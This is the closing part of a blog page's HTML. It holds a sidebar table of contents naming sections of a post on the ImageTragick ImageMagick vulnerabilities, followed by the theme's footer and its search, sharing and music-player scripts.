image decoder</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-CVE-2016-3714-Insufficient-shell-characters-filtering-leads-to-potentially-remote-code-execution"><span class="nav-number">1.1.4.1.1.</span> <span class="nav-text">1. CVE-2016-3714 - Insufficient shell characters filtering leads to(potentially remote) code execution</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-CVE-2016-3718-SSRF"><span class="nav-number">1.1.4.1.2.</span> <span class="nav-text">2. CVE-2016-3718 - SSRF</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-CVE-2016-3715-File-deletion"><span class="nav-number">1.1.4.1.3.</span> <span class="nav-text">3. CVE-2016-3715 - File deletion</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-CVE-2016-3716-File-moving"><span class="nav-number">1.1.4.1.4.</span> <span class="nav-text">4. CVE-2016-3716 - File moving</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-CVE-2016-3717-Local-file-read-independently-reported-by-original-research-author-Stewie"><span class="nav-number">1.1.4.1.5.</span> <span class="nav-text">5. CVE-2016-3717 - Local file read (independently reported by original research author -Stewie)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Vulnerability-Disclosure-Timeline"><span class="nav-number">1.1.4.1.6.</span> <span class="nav-text">Vulnerability Disclosure Timeline:</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FAQs"><span class="nav-number">1.2.</span> <span class="nav-text">FAQs</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Who-found-this-bug"><span class="nav-number">1.2.0.0.1.</span> <span class="nav-text">Who found this bug?</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Will-you-share-the-exploit-with-me"><span class="nav-number">1.2.0.0.2.</span> <span class="nav-text">Will you share the exploit with me?</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#What-are-“magic-bytes”"><span class="nav-number">1.2.0.0.3.</span> <span class="nav-text">What are “magic bytes”?</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Why-are-you-disclosing-a-vulnerability-like-this"><span class="nav-number">1.2.0.0.4.</span> <span class="nav-text">Why are you disclosing a vulnerability like this?</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#How-well-tested-are-these-mitigations"><span class="nav-number">1.2.0.0.5.</span> <span class="nav-text">How well-tested are these mitigations?</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Are-there-other-ways-to-mitigate"><span class="nav-number">1.2.0.0.6.</span> <span class="nav-text">Are there other ways to mitigate?</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Why-is-this-post-so-short"><span class="nav-number">1.2.0.0.7.</span> <span class="nav-text">Why is this post so short?</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#How-can-I-contact-you"><span class="nav-number">1.2.0.0.8.</span> <span class="nav-text">How can I contact you?</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Who-is-“we”"><span class="nav-number">1.2.0.0.9.</span> <span class="nav-text">Who is “we”?</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>
    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Caigen Lee</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">147.3k</span>
  
</div>






  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a></div>




        





        
      </div>
    </footer>
    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    
    
  </div>
  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>


  
  
  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>


  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>


  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
  
  
  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">

  
  
  <script src="/lib/needsharebutton/needsharebutton.js"></script>

  <script>
    
      pbOptions = {};
      
          pbOptions.iconStyle = "box";
      
          pbOptions.boxForm = "horizontal";
      
          pbOptions.position = "bottomCenter";
      
          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
      
      new needShareButton('#needsharebutton-postbottom', pbOptions);
    
    
  </script>

  

  
  


  
  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.3"></script>
  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.3"></script>


  
  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.3"></script>


  <script src="/js/src/Aplayer-Controler.js"></script>
<div id="AP-controler"></div>
<script type="text/javascript">
var myapc=new APlayer_Controler({
		APC_dom:$('#AP-controler'),
		aplayer:ap, //此为绑定的aplayer对象
		attach_right:false,
		position:{top:'300px',bottom:''},
		fixed:true,
		btn_width:100,
		btn_height:120,
		img_src:[
				'https://www.yf2017.top/images/jumpgirl.jpg'],
		img_style:{repeat:'no-repeat',position:'center',size:'contain'},
		ctrls_color:'rgba(173,255,47,0.8)',
		ctrls_hover_color:'rgba(255,140,0,0.7)',
		tips_on:true,
		tips_width:140,
		tips_height:25,
		tips_color:'rgba(255,255,255,0.6)',
		tips_content:{},
		timeout:30
	});
</script>
</body>
</html>
